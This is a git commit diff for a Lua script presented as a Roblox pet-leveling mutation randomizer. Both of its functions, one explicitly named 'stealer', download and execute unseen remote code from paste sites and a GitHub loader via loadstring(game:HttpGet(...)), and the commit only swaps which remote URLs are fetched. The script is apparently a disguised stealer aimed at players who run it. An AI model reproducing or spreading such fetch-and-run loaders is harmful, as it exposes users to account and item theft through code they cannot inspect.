cdd6dc8e2a96298cfee3a29686c7fe3a0a606fd6
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-08-04 17:21:58 +0800

    Update petleveler.mutationrandomizer.lua

--- petleveler.mutationrandomizer.lua
+++ petleveler.mutationrandomizer.lua
@@ -1,8 +1,8 @@
 local function stealer()
-    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ZaaovmMPHU6LUPHq/raw", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()
 end
 local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHubsIds/SerosScript/refs/heads/main/Loader/LoaderV3.lua"))()
+  loadstring(game:HttpGet("https://pastefy.app/SamFj5lo/raw"))()
 
 end
 
